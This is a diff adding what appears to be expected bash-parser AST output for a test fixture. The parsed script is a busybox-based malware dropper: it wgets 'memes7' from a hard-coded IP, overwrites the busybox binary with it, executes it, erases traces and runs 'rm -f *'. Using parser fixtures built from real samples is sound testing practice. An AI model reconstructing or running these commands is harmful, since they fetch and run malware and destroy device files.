+    WordNode(lineno=34, pos=(2093, 2095), word='./'),
+  ]),
+  OperatorNode(lineno=34, op=';', pos=(2095, 2096)),
+  CommandNode(lineno=34, pos=(2097, 2125), parts=[
+    WordNode(lineno=34, pos=(2097, 2104), word='busybox'),
+    WordNode(lineno=34, pos=(2105, 2108), word='cat'),
+    WordNode(lineno=34, pos=(2109, 2115), word='memes6'),
+    RedirectNode(lineno=34, output=
+      WordNode(lineno=34, pos=(2118, 2125), word='busybox'), pos=(2116, 2125), type='>'),
+  ]),
+  OperatorNode(lineno=34, op=';', pos=(2125, 2126)),
+  CommandNode(lineno=34, pos=(2127, 2147), parts=[
+    WordNode(lineno=34, pos=(2127, 2134), word='busybox'),
+    WordNode(lineno=34, pos=(2135, 2137), word='rm'),
+    WordNode(lineno=34, pos=(2138, 2140), word='-f'),
+    WordNode(lineno=34, pos=(2141, 2147), word='memes6'),
+  ]),
+  OperatorNode(lineno=34, op=';', pos=(2147, 2148)),
+  CommandNode(lineno=34, pos=(2149, 2174), parts=[
+    WordNode(lineno=34, pos=(2149, 2156), word='busybox'),
+    WordNode(lineno=34, pos=(2157, 2159), word='cp'),
+    WordNode(lineno=34, pos=(2160, 2167), word='busybox'),
+    WordNode(lineno=34, pos=(2168, 2174), word='memes6'),
+  ]),
+  OperatorNode(lineno=34, op=';', pos=(2174, 2175)),
+  CommandNode(lineno=34, pos=(2176, 2197), parts=[
+    WordNode(lineno=34, pos=(2176, 2183), word='busybox'),
+    WordNode(lineno=34, pos=(2184, 2186), word='rm'),
+    WordNode(lineno=34, pos=(2187, 2189), word='-f'),
+    WordNode(lineno=34, pos=(2190, 2197), word='busybox'),
+  ]),
+  OperatorNode(lineno=34, op=';', pos=(2197, 2198)),
+  CommandNode(lineno=34, pos=(2199, 2207), parts=[
+    WordNode(lineno=34, pos=(2199, 2207), word='./memes6'),
+  ]),
+  OperatorNode(lineno=34, op=';', pos=(2207, 2208)),
+  CommandNode(lineno=34, pos=(2209, 2230), parts=[
+    WordNode(lineno=34, pos=(2209, 2216), word='busybox'),
+    WordNode(lineno=34, pos=(2217, 2219), word='rm'),
+    WordNode(lineno=34, pos=(2220, 2222), word='-f'),
+    WordNode(lineno=34, pos=(2223, 2230), word='memes6*'),
+  ]),
+])
+CommandNode(lineno=35, pos=(2231, 2238), parts=[
+  WordNode(lineno=35, pos=(2231, 2233), word='rm'),
+  WordNode(lineno=35, pos=(2234, 2236), word='-f'),
+  WordNode(lineno=35, pos=(2237, 2238), word='*'),
+])
+ListNode(lineno=36, pos=(2239, 2441), parts=[
+  CommandNode(lineno=36, pos=(2239, 2278), parts=[
+    WordNode(lineno=36, pos=(2239, 2246), word='busybox'),
+    WordNode(lineno=36, pos=(2247, 2251), word='wget'),
+    WordNode(lineno=36, pos=(2252, 2278), word='http://80.82.64.142/memes7'),
+  ]),
+  OperatorNode(lineno=36, op=';', pos=(2278, 2279)),
+  CommandNode(lineno=36, pos=(2280, 2306), parts=[
+    WordNode(lineno=36, pos=(2280, 2287), word='busybox'),
+    WordNode(lineno=36, pos=(2288, 2290), word='cp'),
+    WordNode(lineno=36, pos=(2291, 2303), word='/bin/busybox'),
+    WordNode(lineno=36, pos=(2304, 2306), word='./'),
+  ]),
+  OperatorNode(lineno=36, op=';', pos=(2306, 2307)),
+  CommandNode(lineno=36, pos=(2308, 2336), parts=[
+    WordNode(lineno=36, pos=(2308, 2315), word='busybox'),
+    WordNode(lineno=36, pos=(2316, 2319), word='cat'),
+    WordNode(lineno=36, pos=(2320, 2326), word='memes7'),
+    RedirectNode(lineno=36, output=
+      WordNode(lineno=36, pos=(2329, 2336), word='busybox'), pos=(2327, 2336), type='>'),
+  ]),
+  OperatorNode(lineno=36, op=';', pos=(2336, 2337)),
+  CommandNode(lineno=36, pos=(2338, 2358), parts=[
+    WordNode(lineno=36, pos=(2338, 2345), word='busybox'),
+    WordNode(lineno=36, pos=(2346, 2348), word='rm'),
+    WordNode(lineno=36, pos=(2349, 2351), word='-f'),
+    WordNode(lineno=36, pos=(2352, 2358), word='memes7'),
+  ]),
+  OperatorNode(lineno=36, op=';', pos=(2358, 2359)),
+  CommandNode(lineno=36, pos=(2360, 2385), parts=[
+    WordNode(lineno=36, pos=(2360, 2367), word='busybox'),
+    WordNode(lineno=36, pos=(2368, 2370), word='cp'),
+    WordNode(lineno=36, pos=(2371, 2378), word='busybox'),
+    WordNode(lineno=36, pos=(2379, 2385), word='memes7'),
+  ]),
+  OperatorNode(lineno=36, op=';', pos=(2385, 2386)),
+  CommandNode(lineno=36, pos=(2387, 2408), parts=[
+    WordNode(lineno=36, pos=(2387, 2394), word='busybox'),
+    WordNode(lineno=36, pos=(2395, 2397), word='rm'),
+    WordNode(lineno=36, pos=(2398, 2400), word='-f'),
+    WordNode(lineno=36, pos=(2401, 2408), word='busybox'),
+  ]),
+  OperatorNode(lineno=36, op=';', pos=(2408, 2409)),
+  CommandNode(lineno=36, pos=(2410, 2418), parts=[
+    WordNode(lineno=36, pos=(2410, 2418), word='./memes7'),
+  ]),
+  OperatorNode(lineno=36, op=';', pos=(2418, 2419)),
+  CommandNode(lineno=36, pos=(2420, 2441), parts=[
+    WordNode(lineno=36, pos=(2420, 2427), word='busybox'),
+    WordNode(lineno=36, pos=(2428, 2430), word='rm'),
+    WordNode(lineno=36, pos=(2431, 2433), word='-f'),
+    WordNode(lineno=36, pos=(2434, 2441), word='memes7*'),
+  ]),
+])
+CommandNode(lineno=37, pos=(2442, 2449), parts=[
+  WordNode(lineno=37, pos=(2442, 2444), word='rm'),
+  WordNode(lineno=37, pos=(2445, 2447), word='-f'),
+  WordNode(lineno=37, pos=(2448, 2449), word='*'),
+])
+CommandNode(lineno=38, pos=(2450, 2457), parts=[
+  WordNode(lineno=38, pos=(2450, 2455), word='sleep'),
+  WordNode(lineno=38, pos=(2456, 2457), word='1'),
+])
+CommandNode(lineno=39, pos=(2458, 2462), parts=[
+  WordNode(lineno=39, pos=(2458, 2462), word='exit'),
+])
